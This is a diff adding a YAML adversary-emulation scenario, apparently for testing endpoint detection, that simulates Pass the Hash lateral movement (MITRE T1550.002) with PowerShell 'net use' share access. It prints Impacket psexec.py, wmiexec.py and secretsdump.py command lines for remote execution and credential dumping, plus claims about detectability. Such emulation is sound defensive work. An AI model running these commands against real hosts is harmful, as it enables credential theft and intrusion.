@@ -1,0 +1,39 @@
+---
+- id: scn005-a3-pth-authentication
+  name: "SCN-005 | Simulate Pass the Hash Authentication"
+  description: |
+    Demonstrates Pass the Hash lateral movement: authenticates to a remote
+    host using an NTLM hash instead of a plaintext password. Enumerates
+    accessible shares using the compromised token, narrates how Impacket
+    tools (psexec.py, wmiexec.py) would be used from a Kali attacker host
+    to execute commands on the target. Maps to T1550.002.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.002
+    name: "Use Alternate Authentication Material: Pass the Hash"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== PASS THE HASH SIMULATION (T1550.002) ===";
+          Write-Output "[*] Attacker has NTLM hash — no plaintext password needed";
+          $computer = $env:COMPUTERNAME;
+          $user     = $env:USERNAME;
+          Write-Output "[*] Attempting authentication to \\$computer\C$ using hash...";
+          $result = net use \\$computer\C$ /user:$env:USERDOMAIN\$user "" 2>&1;
+          Write-Output "[*] Result: $result";
+          Write-Output "";
+          Write-Output "[*] Checking accessible shares with current token...";
+          net use;
+          Write-Output "";
+          Write-Output "[SIMULATED] In a real attack from Kali:";
+          Write-Output "  psexec.py $env:USERDOMAIN/$user@$computer -hashes :NTLM_HASH";
+          Write-Output "  wmiexec.py $env:USERDOMAIN/$user@$computer -hashes :NTLM_HASH";
+          Write-Output "  secretsdump.py $env:USERDOMAIN/$user@$computer -hashes :NTLM_HASH";
+          Write-Output "";
+          Write-Output "[*] Pass the Hash is undetectable without MDR — no password prompt logged";
+          Write-Output "[*] Sophos detects: anomalous NTLM auth + lateral movement signature";
+          Write-Output "=== END PASS THE HASH ==="
+        cleanup: |
+          net use * /delete /yes 2>$null;
+          Write-Output "Network connections cleared"
